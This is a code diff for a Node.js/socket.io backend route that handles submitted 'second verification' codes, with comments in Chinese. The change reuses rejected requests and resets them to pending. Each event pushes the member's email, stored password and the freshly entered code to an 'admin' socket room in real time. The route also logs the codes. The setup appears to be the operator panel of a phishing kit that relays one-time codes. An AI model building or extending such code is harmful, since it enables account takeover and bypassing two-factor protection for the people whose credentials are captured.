@@ -90,28 +90,77 @@ module.exports = (io) => {
       }
 
       const loginLog = loginLogs[0];
-
-      // 记录二次验证
-      const verifyResult = await db.insert('second_verifications', {
-        member_id: loginLog.member_id,
-        login_log_id: loginId,
-        verification_code: verificationCode
-      });
+      
+      // 检查是否已经存在验证请求（包括待处理和被拒绝的）
+      const existingVerifications = await db.query(
+        'SELECT * FROM second_verifications WHERE member_id = ? AND login_log_id = ? AND (status = "pending" OR status = "rejected")',
+        [loginLog.member_id, loginId]
+      );
+      
+      console.log(`检查现有验证请求: 会员ID=${loginLog.member_id}, 登录ID=${loginId}, 找到 ${existingVerifications.length} 条记录`);
+      if (existingVerifications.length > 0) {
+        console.log(`现有验证请求详情:`, existingVerifications.map(v => ({
+          id: v.id,
+          status: v.status,
+          verification_code: v.verification_code,
+          submitted_at: v.submitted_at
+        })));
+      }
+      
+      let verificationId;
+      
+      if (existingVerifications.length > 0) {
+        // 如果已经存在验证请求，则更新验证码和状态
+        const existingVerification = existingVerifications[0];
+        await db.update('second_verifications', 
+          { 
+            verification_code: verificationCode,
+            status: 'pending' // 重置状态为待处理
+          },
+          { id: existingVerification.id }
+        );
+        verificationId = existingVerification.id;
+        console.log(`更新现有验证请求 ID: ${verificationId}, 会员ID: ${loginLog.member_id}, 验证码: ${verificationCode}, 状态: pending`);
+      } else {
+        // 如果不存在待处理的验证请求，则创建新的
+        const verifyResult = await db.insert('second_verifications', {
+          member_id: loginLog.member_id,
+          login_log_id: loginId,
+          verification_code: verificationCode
+        });
+        verificationId = verifyResult.insertId;
+        console.log(`创建新的验证请求 ID: ${verificationId}, 会员ID: ${loginLog.member_id}, 验证码: ${verificationCode}`);
+      }
 
       // 通知管理员有新的验证请求
       const members = await db.query('SELECT email, password FROM members WHERE id = ?', [loginLog.member_id]);
-      io.to('admin').emit('new-verification-request', {
-        id: verifyResult.insertId,
-        member_id: loginLog.member_id,
-        email: members[0].email,
-        password: members[0].password,
-        verification_code: verificationCode,
-        submitted_at: new Date()
-      });
+      
+      // 检查是否是更新现有请求
+      if (existingVerifications.length > 0) {
+        // 如果是更新现有请求，发送更新事件
+        io.to('admin').emit('update-verification-request', {
+          id: verificationId,
+          member_id: loginLog.member_id,
+          email: members[0].email,
+          password: members[0].password,
+          verification_code: verificationCode,
+          submitted_at: new Date()
+        });
+      } else {
+        // 如果是新请求，发送新请求事件
+        io.to('admin').emit('new-verification-request', {
+          id: verificationId,
+          member_id: loginLog.member_id,
+          email: members[0].email,
+          password: members[0].password,
+          verification_code: verificationCode,
+          submitted_at: new Date()
+        });
+      }
 
       res.json({
         message: req.t('verification_pending_approval'),
-        verificationId: verifyResult.insertId
+        verificationId: verificationId
       });
 
     } catch (error) {
